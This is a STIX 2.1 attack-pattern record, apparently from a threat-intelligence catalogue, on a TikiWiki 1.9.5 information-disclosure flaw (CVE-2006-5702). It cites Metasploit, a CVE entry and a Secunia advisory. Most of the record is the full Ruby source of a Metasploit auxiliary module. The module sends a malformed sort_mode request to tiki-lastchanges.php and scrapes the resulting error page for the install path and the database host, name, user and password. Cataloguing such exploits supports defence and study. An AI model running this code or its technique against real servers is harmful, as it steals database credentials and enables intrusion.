{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7c4f0ae-7011-43af-8379-2494af72ca5a",
    "created": "2024-08-14T16:22:46.617075Z",
    "modified": "2024-08-14T16:22:46.617078Z",
    "name": "TikiWiki Information Disclosure",
    "description": " A vulnerability has been reported in Tikiwiki, which can be exploited by an anonymous user to dump the MySQL user & passwd just by creating a mysql error with the \"sort_mode\" var.  The vulnerability was reported in Tikiwiki version 1.9.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/tikiwiki/tikidblib.rb",
            "external_id": "tikidblib.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5702"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20080211225557/http://secunia.com/advisories/22678/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TikiWiki Information Disclosure',\n      'Description'    => %q{\n          A vulnerability has been reported in Tikiwiki, which can be exploited by\n        an anonymous user to dump the MySQL user & passwd just by creating a mysql\n        error with the \"sort_mode\" var.\n\n        The vulnerability was reported in Tikiwiki version 1.9.5.\n      },\n      'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '30172'],\n          ['BID', '20858'],\n          ['CVE', '2006-5702'],\n          ['URL', 'https://web.archive.org/web/20080211225557/http://secunia.com/advisories/22678/'],\n        ],\n      'DisclosureDate' => '2006-11-01',\n      'Actions'        =>\n        [\n          ['Dump', 'Description' => 'Dump user and password']\n        ],\n      'DefaultAction'  => 'Dump'\n      ))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"TikiWiki directory path\", \"/tikiwiki\"]),\n      ])\n  end\n\n  def run\n    print_status(\"Establishing a connection to the target...\")\n\n    uri = normalize_uri(datastore['URI'], '/tiki-lastchanges.php')\n    rpath = uri + \"?days=1&offset=0&sort_mode=\"\n\n    res = send_request_raw({\n      'uri'     => rpath,\n      'method'  => 'GET',\n      'headers' =>\n      {\n        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n        'Connection' => 'Close',\n      }\n    }, 25)\n\n    if (res and res.message == \"OK\")\n      print_status(\"Get informations about database...\")\n\n      n = 0\n      c = 0\n\n      # puts \"body is #{res.body.length} bytes\"\n      infos = res.body.split(/\\r?\\n/)\n      infos.each do |row|\n        # puts row.inspect\n        if (c < 6)\n          if (row.match(/\\[\"file\"\\]=>/))\n            c+=1\n            x = n + 1\n            y = infos[x].match(/string\\(\\d+\\) \"(.*)\"/m)\n            print_status(\"Install path : #{y[1]}\")\n          end\n          if (row.match(/\\[\"databaseType\"\\]=>/))\n            c+=1\n            x = n + 1\n            y = infos[x].match(/string\\(\\d+\\) \"(.*)\"/m)\n            print_status(\"DB type      : #{y[1]}\")\n          end\n          if (row.match(/\\[\"database\"\\]=>/))\n            c+=1\n            x = n + 1\n            y = infos[x].match(/string\\(\\d+\\) \"(.*)\"/m)\n            print_status(\"DB name      : #{y[1]}\")\n          end\n          if (row.match(/\\[\"host\"\\]=>/))\n            c+=1\n            x = n + 1\n            y = infos[x].match(/string\\(\\d+\\) \"(.*)\"/m)\n            print_status(\"DB host      : #{y[1]}\")\n          end\n          if (row.match(/\\[\"user\"\\]=>/))\n            c+=1\n            x = n + 1\n            y = infos[x].match(/string\\(\\d+\\) \"(.*)\"/m)\n            print_status(\"DB user      : #{y[1]}\")\n          end\n          if (row.match(/\\[\"password\"\\]=>/))\n            c+=1\n            x = n + 1\n            y = infos[x].match(/string\\(\\d+\\) \"(.*)\"/m)\n            print_status(\"DB password  : #{y[1]}\")\n          end\n          n+=1\n        end\n      end\n\n      if (c == 0)\n        print_status(\"Could not obtain informations about database.\")\n      end\n\n    else\n      print_status(\"No response from the server.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-01"
}